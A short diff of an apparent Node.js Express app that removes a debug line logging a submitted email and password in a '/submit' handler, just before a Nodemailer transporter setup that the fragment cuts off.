@@ -25,7 +25,7 @@ app.post('/password', (req, res) => {
 
 app.post('/submit', (req, res) => {
     const { email, password } = req.body;
-    console.log(`Email: ${email}\nPassword: ${password}`); // Debugging log
+  
 
     // Configure Nodemailer
     const transporter = nodemailer.createTransport({
